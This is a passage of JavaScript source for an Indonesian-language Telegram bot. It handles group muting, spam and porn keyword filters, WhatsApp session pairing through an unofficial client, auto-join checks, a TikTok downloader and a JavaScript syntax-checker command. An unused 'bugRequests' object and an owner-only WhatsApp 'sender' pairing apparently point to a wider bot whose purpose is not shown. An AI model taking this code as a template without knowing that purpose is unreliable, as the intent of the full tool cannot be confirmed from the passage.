      `<blockquote><tg-emoji emoji-id="5805345674383855340">🚫</tg-emoji> <b>${mentionUser}</b> dimute 5 menit karena ${reason}.</blockquote>`, {
        parse_mode: "HTML"
      }
    );
    
    console.log(`[MUTE SUCCESS] User ${userId} dimute sampai ${new Date(until * 1000).toLocaleString()}`);
    return true;
    
  } catch(err) {
    const errorMsg = err.response?.data?.description || err.message;
    
    const skipErrors = [
      "user is already muted",
      "user is restricted",
      "user is an administrator",
      "not enough rights"
    ];
    
    if (!skipErrors.some(e => errorMsg?.toLowerCase().includes(e))) {
      console.log(`[MUTE ERROR] User ${userId}:`, errorMsg);
    }
    return false;
  }
}

async function getJadwal(kota) {
  try {
    const today = moment().format("YYYY-MM-DD");

    if (jadwalCache[kota] && jadwalCache[kota].date === today) {
      return jadwalCache[kota].data;
    }

    const res = await axios.get(
      `https://api.betabotz.eu.org/api/tools/jadwalshalatv2?kota=${kota}&apikey=${APIKEY}`
    );

    if (!res.data.status) return null;

    jadwalCache[kota] = {
      data: res.data.result,
      date: today
    };

    return res.data.result;
  } catch (e) {
    console.log("Error jadwal:", e.message);
    return null;
  }
}

function parseEntities(text, entities = []) {
  if (!entities.length) return text

  entities = [...entities].sort((a, b) => a.offset - b.offset)

  let result = ""
  let last = 0

  for (const e of entities) {
    result += text.slice(last, e.offset)

    const part = text.slice(e.offset, e.offset + e.length)

    if (e.type === "custom_emoji") {
      result += `<tg-emoji emoji-id="${e.custom_emoji_id}">${part}</tg-emoji>`
    }

    else if (e.type === "bold") {
      result += `<b>${part}</b>`
    }

    else if (e.type === "italic") {
      result += `<i>${part}</i>`
    }

    else if (e.type === "blockquote") {
      result += `<blockquote>${part}</blockquote>`
    }

    else {
      result += part
    }

    last = e.offset + e.length
  }

  result += text.slice(last)

  return result
}

function mentionUser(user) {
  const name = escapeHtml(
    user.first_name + (user.last_name ? " " + user.last_name : "")
  );

  if (user.username) {
    return `@${user.username}`;
  } else {
    return `<a href="tg://user?id=${user.id}">${name}</a>`;
  }
}

function parseDuration(timeStr) {
  if (!timeStr) return 0;
  const match = timeStr.match(/^(\d+)(s|m|h|d)$/i);
  if (!match) return 0;
  
  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();
  
  switch (unit) {
    case 's': return value;
    case 'm': return value * 60;
    case 'h': return value * 3600;
    case 'd': return value * 86400;
    default: return 0;
  }
}

const getVps = () => {
  const uptimeSeconds = os.uptime();

  const days = Math.floor(uptimeSeconds / 86400);
  const hours = Math.floor((uptimeSeconds % 86400) / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${days}d ${hours}h ${minutes}m ${seconds}s`;
};

const getUptime = () => {
  const uptimeSeconds = Math.floor(process.uptime());

  const days = Math.floor(uptimeSeconds / 86400);
  const hours = Math.floor((uptimeSeconds % 86400) / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = uptimeSeconds % 60;

  return `${days}d ${hours}h ${minutes}m ${seconds}s`;
};

const promoKeywords = [
  "wts","wtb","jual","promo","promosi","NEED",
  "open reseller","need reseller","reseller",
  "price","harga","rp","contact","testi","bug",
  "order","via whatsapp","benefit","daftar","open",
  "testimoni","garansi","permanent","open akun",
"apk","sc","script","panel","join","akun","amanah",
"minat","pm","pv","chat saya","follow","terpercaya",
"panel","script","sc","apk","bot","jasa","murah","24jam","free update","full tutor","bimbingan","apk sadap","domain","sadap","tracker","hack","bypass","panel pterodactyl","seller","owner","owner panel","ress panel","panel legal","vps","nokos","gacha","need","di bio","1k","2k","3k","4k","5k","6k","7k","8k","9k","10k","11k","12k","13k","14k","15k","16k","17k","18k","19k","20k","21k","22k","23k","24k","25k","26k","27k","28k","29k","30k","31k","32k","33k","34k","35k","36k","37k","38k","39k","40k","41k","42k","43k","44k","45k","46k","47k","48k","49k","50k","51k","52k","53k","54k","55k","56k","57k","58k","59k","60k","61k","62k","63k","64k","65k","66k","67k","68k","69k","70k","71k","72k","73k","74k","75k","76k","77k","78k","79k","80k","81k","82k","83k","84k","85k","86k","87k","88k","89k","90k","91k","92k","93k","94k","95k","96k","97k","98k","99k","100k"
];

const pornKeywords = [
"bokep","porn","porno","xnxx","xvideos","redtube",
"jav","hentai","sex","ngentot","ngewe","sange","ewean",
"colmek","memek","kontol","pussy","dick","blowjob","coli","ngocok",
"milf","stepmom","step sister","onlyfans","nsfw","vcs","ange"
];

const promoPatterns = [

/rp\s?\d+/i,
/\d+k\b/i,
/price\s*:/i,
/contact\s*:/i,
/testimoni\s*:/i,
/order\s*:/i,
/minat\s*\?/i,
/pv\s*:/i,
/pm\s*:/i,
/@[\w_]{5,}/,
/t\.me\//i,
/https?:\/\//i

];

const pornLinks = [

/xnxx\.com/i,
/xvideos\.com/i,
/pornhub\.com/i,
/redtube\.com/i,
/youporn\.com/i,
/hentai/i,
/rule34/i,
/onlyfans\.com/i

];

const KOTA_LIST = ["tasikmalaya", "jakarta", "bandung", "surabaya", "palembang"];

function formatWaktu(waktu) {
  return waktu.split(" ")[0];
}

const delay = (ms) => new Promise(res => setTimeout(res, ms));
const makeCommand = (cmd) => new RegExp(`^\\/${cmd}(@${bot.options.username})?\\s*(.*)$`, 'i');


// --- Start WA Session ---
async function startSession() {
    try {
        console.log("🚀 Memulai WhatsApp session...");

        const { state, saveCreds } = await useMultiFileAuthState('./session');
        const { version } = await fetchLatestBaileysVersion();

        sock = makeWASocket({
            version,
            auth: state,
            logger: pino({ level: 'silent' }),
            browser: ['Windows', 'Chrome', '120.0.0'],
            keepAliveIntervalMs: 30000,
        });

        sock.ev.on('creds.update', saveCreds);

        return new Promise((resolve) => {
            sock.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect } = update;

                if (connection === 'connecting') {
                    console.log("⏳ CONNECTING...");
                    resolve(true); // 🔥 FIX DISINI
                }

                if (connection === 'open') {
                    console.log("🟢 CONNECTED");

                    if (pairingTargetChatId) {
                        await bot.sendMessage(pairingTargetChatId, "✅ WhatsApp berhasil terhubung");
                        pairingTargetChatId = null;
                    }
                }

                if (connection === 'close') {
                    const reason = lastDisconnect?.error?.output?.statusCode;

                    const shouldReconnect = reason !== DisconnectReason.loggedOut;

                    if (shouldReconnect) {
                        setTimeout(() => startSession(), 3000);
                    }
                }
            });
        });

    } catch (err) {
        console.error("❌ ERROR START SESSION:", err);
    }
}

bot.onText(/\/addsender (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    let botNumber = match[1].replace(/[^0-9]/g, '');

    if (!isOwner(senderId)) {
        return bot.sendMessage(chatId, '𝙷𝙰𝙽𝚈𝙰 𝙾𝚆𝙽𝙴𝚁 𝙰𝙽𝙹');
    }

    // ❗ cek session beneran ada isi
    if (fs.existsSync('./session') && fs.readdirSync('./session').length > 0) {
        return bot.sendMessage(chatId, `
<blockquote>
⚠️ 𝚂𝚎𝚜𝚜𝚒𝚘𝚗 𝙼𝚊𝚜𝚒𝚑 𝙰𝚍𝚊 𝚆𝚘𝚒

𝙶𝚞𝚗𝚊𝚔𝚊𝚗 <code>/killsession</code> 𝚍𝚞𝚕𝚞 𝚓𝚒𝚛.
</blockquote>
        `, { parse_mode: "HTML" });
    }

    try {
        pairingTargetChatId = chatId;

        // 🔥 start session (tidak nunggu open lagi)
        await startSession();

        // 🔥 delay biar socket siap
        await new Promise(r => setTimeout(r, 1500));

        let code = null;

        // 🔁 retry ambil pairing code
        for (let i = 0; i < 5; i++) {
            try {
                code = await sock.requestPairingCode(botNumber, "RARAIMUP");
                if (code) break;
            } catch (err) {
                await new Promise(r => setTimeout(r, 1000));
            }
        }

        if (!code) {
            return bot.sendMessage(chatId, `
<blockquote>
❌ <b>𝙶𝚊𝚐𝚊𝚕 𝙰𝚖𝚋𝚒𝚕 𝙿𝚊𝚒𝚛𝚒𝚗𝚐</b>

𝙲𝚘𝚋𝚊 𝙱𝚎𝚋𝚎𝚛𝚊𝚙𝚊 𝙳𝚎𝚝𝚒𝚔 𝙻𝚊𝚐𝚒 𝚈𝚊𝚊.
</blockquote>
            `, { parse_mode: "HTML" });
        }

        const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;

        await bot.sendMessage(chatId, `
<blockquote>
🔐 <b>𝙿𝙰𝙸𝚁𝙸𝙽𝙶 𝙲𝙾𝙳𝙴</b>

━━━━━━━━━━━━━━━━━━
📱 𝙽𝚘𝚖𝚘𝚛:
<code>${botNumber}</code>

🔑 𝙲𝚘𝚍𝚎:
<code>${formattedCode}</code>
━━━━━━━━━━━━━━━━━━
</blockquote>
        `, { parse_mode: "HTML" });

    } catch (err) {
        console.error("PAIRING ERROR:", err);

        bot.sendMessage(chatId, `
<blockquote>
❌ <b>𝙶𝚊𝚐𝚊𝚕 𝙿𝚊𝚒𝚛𝚒𝚗𝚐</b>

𝙺𝚎𝚖𝚞𝚗𝚐𝚔𝚒𝚗𝚊𝚗:
• 𝙽𝚘𝚖𝚘𝚛 𝚃𝚒𝚍𝚊𝚔 𝚅𝚊𝚕𝚒𝚍
• 𝚆𝚑𝚊𝚝𝚜𝙰𝚙𝚙 𝚃𝚒𝚍𝚊𝚔 𝙰𝚔𝚝𝚒𝚏
• 𝚂𝚘𝚌𝚔𝚎𝚝 𝙱𝚎𝚕𝚞𝚖 𝚂𝚒𝚊𝚙

𝙲𝚘𝚋𝚊 𝚋𝚎𝚋𝚎𝚛𝚊𝚙𝚊 𝚍𝚎𝚝𝚒𝚔 𝚕𝚊𝚐𝚒 𝚢𝚊𝚊.
</blockquote>
        `, { parse_mode: "HTML" });
    }
});

bot.onText(/\/killsession/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId)) {
        return bot.sendMessage(chatId, '𝙷𝙰𝙽𝚈𝙰 𝙾𝚆𝙽𝙴𝚁 𝙰𝙽𝙹');
    }

    try {
        // 🔴 MATIKAN SOCKET TOTAL
        if (sock) {
            try {
                sock.ev.removeAllListeners();
                sock.ws.close();
            } catch {}
            sock = null;
        }

        // 🗑️ HAPUS SESSION TOTAL
        if (fs.existsSync('./session')) {
            fs.rmSync('./session', { recursive: true, force: true });
        }

        pairingTargetChatId = null;

        await bot.sendMessage(chatId, `
🗑️ 𝚂𝙴𝚂𝚂𝙸𝙾𝙽 𝙳𝙸𝙷𝙰𝙿𝚄𝚂

𝚂𝚎𝚔𝚊𝚛𝚊𝚗𝚐 𝙱𝚒𝚜𝚊:
/addsender
        `);

        console.log("🗑️ SESSION BERSIH");

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ Gagal hapus session");
    }
});
async function autoStart() {
  if (fs.existsSync('./session') && fs.readdirSync('./session').length > 0) {
    await startSession();
  }
}

// ===== /autojoin TANPA PARAM =====
bot.onText(/^\/autojoin$/, (msg) => {
  bot.sendMessage(msg.chat.id,
    `<blockquote>
<tg-emoji emoji-id="5228962845672096235">😈</tg-emoji> 𝙴𝚡𝚊𝚖𝚙𝚕𝚎:

/autojoin on
/autojoin off
    </blockquote>`,
    { parse_mode: "HTML" }
  );
});

// ===== /autojoin ON OFF =====
bot.onText(/\/autojoin (on|off)/, (msg, match) => {
  const chatId = msg.chat.id;
   const senderId = msg.from.id;

    // 🔒 BATASAN OWNER
    if (!isOwner(senderId)) {
      return bot.sendMessage(chatId, '<tg-emoji emoji-id="6332231251277127335">✨</tg-emoji> 𝙷𝙰𝙽𝚈𝙰 𝙾𝚆𝙽𝙴𝚁 𝙰𝙽𝙹');
    }
  autoJoinSettings.enabled = match[1] === "on";
  saveAutoJoin();

  bot.sendMessage(msg.chat.id,
    `<tg-emoji emoji-id="5228962845672096235">😈</tg-emoji> 𝙰𝚞𝚝𝚘 𝙹𝚘𝚒𝚗: ${match[1].toUpperCase()}</blockquote>`,
    { parse_mode: "HTML" }
  );
});

// ===== /setautojoin TANPA PARAM =====
bot.onText(/^\/setautojoin$/, (msg) => {
  bot.sendMessage(msg.chat.id,
    `<blockquote>
<tg-emoji emoji-id="6332231251277127335">✨</tg-emoji> 𝙴𝚡𝚊𝚖𝚙𝚕𝚎:

/setautojoin @Gabrieltzyproooool @criminal4romance

<tg-emoji emoji-id="5422870830856045306">🐈‍⬛</tg-emoji> 𝙱𝚒𝚜𝚊 𝙱𝚊𝚗𝚢𝚊𝚔 𝙻𝚒𝚗𝚔 (𝚙𝚒𝚜𝚊𝚑 𝚜𝚙𝚊𝚜𝚒 𝚓𝚊𝚗𝚐𝚊𝚗 𝚕𝚞𝚙𝚊)
    </blockquote>`,
    { parse_mode: "HTML" }
  );
});

// ===== SET AUTOJOIN =====
bot.onText(/\/setautojoin (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // 🔒 BATASAN OWNER
    if (!isOwner(senderId)) {
      return bot.sendMessage(chatId, '𝙷𝙰𝙽𝚈𝙰 𝙾𝚆𝙽𝙴𝚁 𝙰𝙽𝙹');
    }
  const links = match[1].split(" ").filter(x => x);

  autoJoinSettings.links = links;
  saveAutoJoin();

  bot.sendMessage(msg.chat.id,
    `<blockquote>
<tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji> 𝙰𝚞𝚝𝚘 𝚓𝚘𝚒𝚗 𝙳𝚒𝚜𝚎𝚝𝚝𝚒𝚗𝚐!

<tg-emoji emoji-id="6332231251277127335">✨</tg-emoji> Total: ${links.length}
<tg-emoji emoji-id="5422870830856045306">🐈‍⬛</tg-emoji> ${links.join('\n<tg-emoji emoji-id="6073238044654185876">✨</tg-emoji> ')}

━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5420323339723881652">⚠️</tg-emoji> Syarat:
𝙱𝚘𝚝 𝚑𝚊𝚛𝚞𝚜 𝙳𝚒 𝚃𝚊𝚖𝚋𝚊𝚑𝚔𝚊𝚗 𝙳𝚒 𝙶𝚛𝚘𝚞𝚙 / 𝙲𝚑𝚊𝚗𝚎𝚕 𝚈𝚊𝚗𝚐 𝙳𝚒 𝚂𝚎𝚝 𝙳𝚊𝚗 𝙷𝚊𝚛𝚞𝚜 𝙰𝙳𝙼𝙸𝙽 𝚍𝚒 𝚌𝚑𝚊𝚗𝚗𝚎𝚕/𝚐𝚛𝚘𝚞𝚙 𝚒𝚝𝚞𝚞!
    </blockquote>`,
    { parse_mode: "HTML" }
  );
});
bot.onText(/\/risetjoin/, (msg) => {
  const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // 🔒 BATASAN OWNER
    if (!isOwner(senderId)) {
      return bot.sendMessage(chatId, '𝙷𝙰𝙽𝚈𝙰 𝙾𝚆𝙽𝙴𝚁 𝙰𝙽𝙹');
    }
  autoJoinSettings.links = [];
  saveAutoJoin();

  bot.sendMessage(msg.chat.id,
    `<blockquote>
🗑️ 𝚂𝚎𝚖𝚞𝚊 𝚕𝚒𝚗𝚔 𝚊𝚞𝚝𝚘 𝚓𝚘𝚒𝚗 𝚋𝚎𝚛𝚑𝚊𝚜𝚒𝚕 𝚍𝚒𝚑𝚊𝚙𝚞𝚜!

⚠️ 𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝚜𝚎𝚝 𝚞𝚕𝚊𝚗𝚐 𝚍𝚎𝚗𝚐𝚊𝚗:
/setautojoin
    </blockquote>`,
    { parse_mode: "HTML" }
  );
});
bot.onText(/\/listjoin/i, async (msg) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // 🔒 BATASAN OWNER
    if (!isOwner(senderId)) {
      return bot.sendMessage(chatId, '𝙷𝙰𝙽𝚈𝙰 𝙾𝚆𝙽𝙴𝚁 𝙰𝙽𝙹');
    }

    if (!autoJoinSettings?.links || !autoJoinSettings.links.length) {
      return bot.sendMessage(chatId,
        `<blockquote>
<tg-emoji emoji-id="5420323339723881652">⚠️</tg-emoji> 𝙻𝙸𝙽𝙺 𝙱𝙴𝙻𝚄𝙼 𝙳𝙸𝚂𝙴𝚃!

𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝚊𝚍𝚖𝚒𝚗 𝚜𝚎𝚝 𝚍𝚞𝚕𝚞:
/setautojoin
        </blockquote>`,
        { parse_mode: "HTML" }
      );
    }

    const results = [];

    for (let i = 0; i < autoJoinSettings.links.length; i++) {
      const link = autoJoinSettings.links[i];
      let joined = false;

      try {
        joined = await isUserJoinedAll(bot, senderId, [link]);
      } catch (e) {
        joined = false;
      }

      const statusIcon = joined
 ? '<tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji>'
 : '<tg-emoji emoji-id="5210952531676504517">❌</tg-emoji>';
      results.push(`${statusIcon} ${link}`);
    }

    return bot.sendMessage(chatId,
      `<blockquote>
<tg-emoji emoji-id="5400289821253990206">📝</tg-emoji> 𝙳𝚊𝚏𝚝𝚊𝚛 𝙻𝚒𝚗𝚔 𝙰𝚞𝚝𝚘𝙹𝚘𝚒𝚗:

${results.join("\n")}

<tg-emoji emoji-id="6073238044654185876">✨</tg-emoji> 𝚃𝚊𝚗𝚍𝚊 <tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji> = 𝚂𝚞𝚍𝚊𝚑 𝚓𝚘𝚒𝚗
<tg-emoji emoji-id="5420323339723881652">⚠️</tg-emoji> 𝚃𝚊𝚗𝚍𝚊 <tg-emoji emoji-id="5210952531676504517">❌</tg-emoji> = 𝙱𝚎𝚕𝚞𝚖 𝚓𝚘𝚒𝚗
      </blockquote>`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.log("Error /listjoin:", err);
  }
});

// -------( Fungsional Function Before Parameters )--------- \\
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}

async function tiktokDl(url) {
  return new Promise(async (resolve, reject) => {
    try {
      let data = [];
      function formatNumber(integer) {
        return Number(parseInt(integer)).toLocaleString().replace(/,/g, ".");
      }

      function formatDate(n, locale = "id-ID") {
        let d = new Date(n);
        return d.toLocaleDateString(locale, {
          weekday: "long",
          day: "numeric",
          month: "long",
          year: "numeric",
          hour: "numeric",
          minute: "numeric",
          second: "numeric",
        });
      }

      let domain = "https://www.tikwm.com/api/";
      let res = await (
        await axios.post(
          domain,
          {},
          {
            headers: {
              Accept: "application/json, text/javascript, */*; q=0.01",
              "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
              "Content-Type":
                "application/x-www-form-urlencoded; charset=UTF-8",
              Origin: "https://www.tikwm.com",
              Referer: "https://www.tikwm.com/",
              "User-Agent":
                "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            },
            params: {
              url: url,
              count: 12,
              cursor: 0,
              web: 1,
              hd: 2,
            },
          }
        )
      ).data.data;

      if (!res) return reject("⚠️ *𝙶𝚊𝚐𝚊𝚕 𝚖𝚎𝚗𝚐𝚊𝚖𝚋𝚒𝚕 𝚍𝚊𝚝𝚊!*");

      if (res.duration == 0) {
        res.images.forEach((v) => {
          data.push({ type: "photo", url: v });
        });
      } else {
        data.push(
          {
            type: "watermark",
            url: "https://www.tikwm.com" + res?.wmplay || "/undefined",
          },
          {
            type: "nowatermark",
            url: "https://www.tikwm.com" + res?.play || "/undefined",
          },
          {
            type: "nowatermark_hd",
            url: "https://www.tikwm.com" + res?.hdplay || "/undefined",
          }
        );
      }

      resolve({
        status: true,
        title: res.title,
        taken_at: formatDate(res.create_time).replace("1970", ""),
        region: res.region,
        id: res.id,
        duration: res.duration + " detik",
        cover: "https://www.tikwm.com" + res.cover,
        stats: {
          views: formatNumber(res.play_count),
          likes: formatNumber(res.digg_count),
          comment: formatNumber(res.comment_count),
          share: formatNumber(res.share_count),
          download: formatNumber(res.download_count),
        },
        author: {
          id: res.author.id,
          fullname: res.author.unique_id,
          nickname: res.author.nickname,
          avatar: "https://www.tikwm.com" + res.author.avatar,
        },
        video_links: data,
      });
    } catch (e) {
      reject("⚠️ *𝚃𝚎𝚛𝚓𝚊𝚍𝚒 𝚔𝚎𝚜𝚊𝚕𝚊𝚑𝚊𝚗 𝚜𝚊𝚊𝚝 𝚖𝚎𝚗𝚐𝚊𝚖𝚋𝚒𝚕 𝚟𝚒𝚍𝚎𝚘!*");
    }
  });
}

function getRandomImage() {
  const images = [
    "https://gangalink.vercel.app/i/kqqpcqw2.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}
// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "𝙵𝚘𝚛𝚖𝚊𝚝 𝚜𝚊𝚕𝚊𝚑! 𝙶𝚞𝚗𝚊𝚔𝚊𝚗 𝚌𝚘𝚗𝚝𝚘𝚑: /𝚜𝚎𝚝𝚝𝚒𝚖𝚎𝚛 𝟻𝚖";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `𝙲𝚘𝚘𝚕𝚍𝚘𝚠𝚗 𝚍𝚒𝚊𝚝𝚞𝚛 𝚔𝚎 ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `✅`;
  } else {
    return "❌";
  }
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};

bot.onText(/\/menu/, (msg) => {
  const chatId = msg.chat.id;
  
  
  bot.sendVideo(chatId, "https://files.catbox.moe/f1reii.mp4", {  
    caption: `<tg-emoji emoji-id="6332231251277127335">✨</tg-emoji> ᴋʟɪᴋ ᴄᴏᴍᴀɴᴅ ᴅɪʙᴀᴡᴀʜ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴜɴᴀᴋᴀɴ ʙᴏᴛ :
/start`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝙾𝚠𝚗𝚎𝚛", url: "https://t.me/AbsoluteTheQueen",icon_custom_emoji_id: "6073238044654185876",style:"primary"}], 
      ]
    }
  });
});


 bot.onText(/\/cekemojiid/, async (msg) => {

    console.log(JSON.stringify(msg, null, 2));

    bot.sendMessage(
        msg.chat.id,
        `Reply: ${!!msg.reply_to_message}`
    );

});
            

const waitingAnalyzer = new Set();

bot.onText(/\/fixcode/, async (msg) => {
    waitingAnalyzer.add(msg.from.id);

    bot.sendMessage(
        msg.chat.id,
        `<b>🔍 CODE ANALYZER</b>

Kirim file <code>.js</code> yang ingin dianalisa.`,
        {
            parse_mode: "HTML"
        }
    );
});

bot.on("document", async (msg) => {
    const userId = msg.from.id;

    if (!waitingAnalyzer.has(userId)) return;

    try {
        const fileId = msg.document.file_id;
        const fileName = msg.document.file_name || "unknown.js";

        if (!fileName.endsWith(".js")) {
            return bot.sendMessage(
                msg.chat.id,
                "<b>❌ Hanya file .js yang didukung</b>",
                {
                    parse_mode: "HTML"
                }
            );
        }

        const file = await bot.getFile(fileId);

        const fileUrl =
            `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;

        const response = await axios.get(fileUrl);

        const code = response.data;

        const report = [];

        report.push(
            `<b>📄 File:</b> <code>${fileName}</code>`
        );

        // NODE CHECK
        const fs = require("fs");
        const tempFile =
            `temp_${Date.now()}.js`;

        fs.writeFileSync(tempFile, code);

        const nodeResult = await new Promise((resolve) => {
            exec(
                `node --check "${tempFile}"`,
                (error, stdout, stderr) => {
                    resolve({
                        error,
                        stdout,
                        stderr
                    });
                }
            );
        });

        if (nodeResult.stderr) {

            report.push(
                `<b>❌ NODE CHECK</b>

<pre>${nodeResult.stderr
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;")
                    .slice(0, 1200)}</pre>`
            );

        } else {

            report.push(
                `<b>✅ NODE CHECK</b>
Tidak ditemukan SyntaxError`
            );
        }

        // ACORN CHECK
        try {

            acorn.parse(code, {
                ecmaVersion: "latest"
            });

            report.push(
                `<b>✅ ACORN PARSER</b>
Struktur JavaScript valid`
            );

        } catch (err) {

            report.push(
                `<b>❌ ACORN PARSER</b>

<b>Line:</b> <code>${err.loc?.line || "-"}</code>
<b>Column:</b> <code>${err.loc?.column || "-"}</code>

<pre>${String(err.message)
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;")}</pre>`
            );
        }

        // ESLINT
        try {

            const eslint = new ESLint({
                overrideConfig: {
                    languageOptions: {
                        ecmaVersion: "latest"
                    },
                    rules: {
                        "no-undef": "error",
                        "no-unused-vars": "warn"
                    }
                }
            });

            const results =
                await eslint.lintText(code);

            let issues = [];

            results.forEach((r) => {
                r.messages.forEach((m) => {

                    issues.push(
                        `Line ${m.line}
${m.severity === 2 ? "ERROR" : "WARN"}
${m.message}`
                    );

                });
            });

            if (issues.length) {

                report.push(
                    `<b>⚠️ ESLINT</b>

<pre>${issues
                        .slice(0, 20)
                        .join("\n\n")
                        .replace(/</g, "&lt;")
                        .replace(/>/g, "&gt;")}</pre>`
                );

            } else {

                report.push(
                    `<b>✅ ESLINT</b>
Tidak ditemukan masalah`
                );
            }

        } catch (err) {

            report.push(
                `<b>❌ ESLINT ERROR</b>

<pre>${String(err.message)
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;")}</pre>`
            );
        }

        // HTML TELEGRAM CHECK
        const tags = [
            "blockquote",
            "b",
            "i",
            "u",
            "s",
            "code",
            "pre",
            "tg-spoiler"
        ];

        let htmlErrors = [];

        for (const tag of tags) {

            const open =
                (code.match(
                    new RegExp(`<${tag}>`, "g")
                ) || []).length;

            const close =
                (code.match(
                    new RegExp(`</${tag}>`, "g")
                ) || []).length;

            if (open !== close) {

                htmlErrors.push(
                    `${tag}: buka ${open} | tutup ${close}`
                );
            }
        }

        if (htmlErrors.length) {

            report.push(
                `<b>❌ TELEGRAM HTML</b>

<pre>${htmlErrors.join("\n")}</pre>`
            );

        } else {

            report.push(
                `<b>✅ TELEGRAM HTML</b>
Tag HTML seimbang`
            );
        }

        fs.unlinkSync(tempFile);

        await bot.sendMessage(
            msg.chat.id,
            `<b>🔍 HASIL ANALISA</b>

${report.join("\n\n")}

<b>━━━━━━━━━━━━━━</b>
<b>🤖 Analyzer Selesai</b>`,
            {
                parse_mode: "HTML"
            }
        );

        waitingAnalyzer.delete(userId);

    } catch (err) {

        bot.sendMessage(
            msg.chat.id,
            `<b>❌ ANALYZER ERROR</b>

<pre>${String(err.message)
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")}</pre>`,
            {
                parse_mode: "HTML"
            }
        );
    }
});
           
// Handler untuk /start

bot.onText(/\/allmenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "𝙶𝚊𝚍𝚊 𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 𝚆𝚘𝚔" ;
  const premiumStatus = getPremiumStatus(senderId);
  const jidat = getCurrentDate();
  const bokepjepang = getBotRuntime();
  const randomImage = getRandomImage();
  const version = '1.5';
  const developer = 'Almas';
  const privateEffect = (chatType) => {
  return chatType === "private"
    ? { message_effect_id: "5104841245755180586" }
    : {};
};
    bot.sendVideo(chatId, "https://files.catbox.moe/f1reii.mp4", {

  ...privateEffect(msg.chat.type),

 caption: `<blockquote>
┏━━━━━━━〔 <tg-emoji emoji-id="5463079056255768637">🌟</tg-emoji> 𝚅𝙾𝙸𝙳 𝙿𝚁𝙸𝙼𝙴 <tg-emoji emoji-id="5463079056255768637">🌟</tg-emoji> 〕━━━━━━━┓
           システムオンライン — アクセス許可済み
            - XYRAA4SEX — @Gabrieltzyproooool -
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛


┏━━━━━━━━━━━━━━ <tg-emoji emoji-id="5438559178157222136">📩</tg-emoji> 𝙰𝙻𝙻 𝙼𝙴𝙽𝚄 𝚃𝙾𝚃𝙰𝙻 <tg-emoji emoji-id="5438559178157222136">📩</tg-emoji> ━━━━━━━━━━━━━━┓
                                      <tg-emoji emoji-id="5463139580934892960">📩</tg-emoji> - 𝙼𝙴𝙽𝚄 𝙻𝙸𝚂𝚃 𝙵𝙾𝙻𝙳𝙴𝚁 - <tg-emoji emoji-id="5463139580934892960">📩</tg-emoji>
      <tg-emoji emoji-id="4972319080649327590">📩</tg-emoji> 𝙾𝙽𝙻𝚈 𝚇𝚈𝚁𝙰𝙰 𝙼𝙴𝙽𝚄
      <tg-emoji emoji-id="4972319080649327590">📩</tg-emoji> 𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄
